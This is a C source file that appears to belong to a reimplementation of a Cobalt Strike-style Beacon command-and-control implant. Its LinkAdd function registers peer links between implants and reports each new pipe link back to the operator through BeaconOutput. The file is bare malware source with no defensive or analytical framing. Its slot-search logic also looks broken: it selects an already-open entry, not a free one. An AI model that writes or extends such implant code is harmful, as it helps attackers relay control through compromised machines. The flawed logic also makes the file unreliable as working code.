#include "pch.h"

#include "beacon.h"
#include "protocol.h"

typedef struct _LINK_ENTRY
{
	int bid;
	PROTOCOL protocol;
	BOOL isOpen;
	char* callbackData;
	int callbackLength;
	int lastPingTime;
} LINK_ENTRY;

LINK_ENTRY gLinks[28] = { 0 };

BOOL LinkAdd(PROTOCOL* protocol, int flags)
{
	char buffer[256] = { 0 };
	if (!protocol->waitForData(protocol, 30000))
		return FALSE;

	int read = protocol->read(protocol, buffer, sizeof(buffer));
	if (read < 0)
		return FALSE;

	int bid = *(int*)buffer;
	LINK_ENTRY* openLink = NULL;
	for(int i = 0; i < sizeof(gLinks)/sizeof(gLinks[0]); i++)
	{
		if (gLinks[i].isOpen)
		{
			openLink = &gLinks[i];
			break;
		}
	}

	if (!openLink)
	{
		LERROR("Maximum links reached. Disconnect one");
		BeaconErrorNA(ERROR_MAXIMUM_LINKS_REACHED);
		return FALSE;
	}

	openLink->bid = bid;
	openLink->protocol = *protocol;
	openLink->isOpen = TRUE;

	if ( openLink->callbackData == NULL )
	{
		openLink->callbackData = malloc(0x100);

		if (openLink->callbackData == NULL)
			return FALSE;
	}

	formatp format;
	BeaconFormatUse(&format, openLink->callbackData, 0x100);
	BeaconFormatInt(&format, bid);
	BeaconFormatInt(&format, flags);
	BeaconFormatAppend(&format, buffer + sizeof(int), read - sizeof(int));

	openLink->callbackLength = BeaconDataLength(&format);
	BeaconOutput(CALLBACK_PIPE_OPEN, openLink->callbackData, openLink->callbackLength);

	return TRUE;
}
